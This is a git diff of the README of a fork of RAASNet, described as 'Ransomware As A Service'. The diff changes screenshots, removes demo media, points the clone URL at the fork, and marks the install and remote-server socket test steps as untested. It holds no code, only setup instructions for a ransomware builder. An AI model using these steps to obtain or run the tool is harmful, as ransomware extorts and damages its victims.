@@ -8,29 +8,15 @@ This repository was forked from [CesarAyalaDev/RAASNet](https://github.com/Cesar
   Ransomware As A Service
 </p>
 
-![alt text](./demo/RAASNET-demo.png)
-![alt text](./demo/panel1.png)
-![alt text](./demo/panel2.png)
-![alt text](./demo/new_profile.png)
-![alt text](./demo/demonware_demo.jpeg)
+![alt text](./demo/MainMenu.PNG)
+![alt text](./demo/CreatePayload.PNG)
+![alt text](./demo/Compile.PNG)
+![alt text](./demo/Alert.PNG)
 
-<h1 align="center">
-  Super Fast Encryption!
-</h1>
-<br>
-
-![alt text](./demo/PyCrypto-vs-PyAES_demo_10fps.gif "Encryption Speed Demo")
 <br>
 
 <h1 align="center">
-   Usage Demo
-</h1>
-
-<a href="https://www.youtube.com/watch?v=2GQaWL6eSxA" target="_blank"><img src="https://i.ytimg.com/vi/2GQaWL6eSxA/hqdefault.jpg" 
-alt="RAASNet demo" width="240" height="180" border="10" /></a>
-
-<h1 align="center">
-   Please read
+   Please read, description by the original author
 </h1>
 <br>
 <p align=center>
@@ -88,7 +74,7 @@ Download and install the latest version of Python 3.<br>
 <br>
 Then do:<br>
 ```Shell
-git clone https://github.com/leonv024/RAASNet.git
+git clone https://github.com/Dev-Lj/RAASNet.git
 ```
 
 ```Shell
@@ -99,12 +85,12 @@ pip3 install -r requirements.txt
 python3 RAASNet.py
 ```
 
-On Linux, you might need to install these packages:
+On Linux, you might need to install these packages (untested):
 ```Shell
 sudo apt install python3-tk python3-pil python3-pil.imagetk
 ```
 
-Testing connection with remote server:
+Testing connection with remote server (untested):
 ```Shell
 # Change the host and port in test_socket.py, default is 127.0.0.1 on port 8989
 python3 test_socket.py
